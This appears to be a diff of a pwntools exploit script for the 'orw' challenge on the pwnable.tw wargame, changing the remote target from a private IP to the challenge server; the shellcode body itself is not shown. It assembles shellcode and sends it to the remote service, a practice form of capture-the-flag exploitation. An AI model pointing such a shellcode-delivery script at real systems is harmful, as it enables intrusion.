@@ -1,7 +1,7 @@
+# -*- coding: utf-8 -*-
 from pwn import *
 context(arch = 'x86_64',os='linux')
 context.log_level='debug'
-
 
 code="""
 
@@ -30,7 +30,7 @@ work:
 """
 
 shellcode = asm(code)
-conn=remote('10.131.1.19',60002)
+conn=remote('chall.pwnable.tw',10001)
 # conn=process("./orw")
 print conn.recvuntil(':')
 conn.send(shellcode)
